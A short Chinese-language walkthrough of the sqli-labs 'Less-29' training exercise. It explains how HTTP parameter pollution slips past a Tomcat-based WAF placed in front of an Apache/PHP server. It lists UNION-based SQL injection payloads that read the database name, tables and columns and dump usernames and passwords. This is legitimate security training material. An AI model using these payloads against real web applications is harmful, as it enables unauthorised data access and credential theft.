---
title: less29
url: https://www.yuque.com/u29002979/ep2zrx/mw031zihkm1gaxqf
---

```bash
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

> This Site Protected byWorld's Best Firewell
> 本网站受世界最佳防火墙保护

`**?id=1&id=2**`

> Your Login name:Angelina
> Your Password:I-kill-you

服务器端有两个部分：
第一部分是tomcat为引擎的jsp型服务器，
第二部分是apache为引擎的php服务器，
真正提供web服务的是php服务器,
往往在tomcat的服务器处做过滤处理，功能类似于waf，
由于解析参数的机制不同，我们可以利用该原理绕过waf的检测;
数据解析的顺序：tomcat从前往后， **appache从后往前**。\ <a name="ohpIT"></a>

# HTTP参数污染

<a name="iQW9u"></a>

## 联合查询

> **?id=1\&id=0'**

```bash
查看当前数据库名称
?id=1&id=0' union select 1,2,(select database()) --+

查看数据表名称
?id=1&id=0' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+

爆破字段名称
?id=1&id=0' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')--+

爆破字段内容 
?id=1&id=0' union select 1,2,(select group_concat(username,0x7e,password)from security.users )--+
```
